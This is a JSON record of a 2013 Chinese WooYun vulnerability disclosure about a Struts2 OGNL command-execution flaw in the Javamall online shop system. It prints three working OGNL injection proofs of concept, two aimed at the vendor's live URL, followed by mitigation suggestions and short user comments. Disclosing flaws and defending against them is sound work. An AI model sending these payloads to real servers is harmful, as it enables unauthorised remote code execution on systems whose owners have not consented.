{"id": 8607, "wybug_id": "wooyun-2013-032892", "wybug_title": "Javamall网店系统Struts2漏洞", "wybug_corp": "Javamall网店", "wybug_author": "园长", "wybug_date": "2013-07-31 07:49", "wybug_open_date": "2013-10-29 07:49", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-31：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 本来打算看下源码，结果看到WEB-INF下的lib包有Struts2都懒得瞧了，提S2虽然很无趣... 详细说明：  官网和客户的网站都能执行。POC1:('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(%22[/ok]%22)')(d))&(i99)(('\\43xman.getWriter().close()')(d))POC4:http://www.javamall.com.cn/core/adv!click.do?advid=11&class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]POC7：http://www.javamall.com.cn/core/adv!click.do?advid=11&redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()}\n\n命令执行：\n\n客户的网站：\n\n   漏洞证明：  \n\n\n\n   修复方案：  Struts2:关于修补仅提供思路，具体的方法和补丁不提供了。Struts2默认后缀是action或者不写后缀，有的改过代码的可能其他后缀如.htm、.do，那么我们只要拦截这些请求进行过滤就行了。1、  从CDN层可以拦截所有Struts2的请求过滤OGNL执行代码2、  从Server层在请求Struts2之前拦截其Ognl执行。3、  在项目层面可以在struts2的filter加一层拦截4、  在Struts2可以用拦截器拦截5、  在Ognl源码包可以拦截恶意的Ognl请求6、  实在没办法就打补丁7、  终极解决办法可以考虑使用其他MVC框架   版权声明：转载请注明来源 园长@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-07-31 08:11 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-07-31 13:21 |    \t\tDeep \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 一个小白.想要变小黑.)\t\t \n  躺枪    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}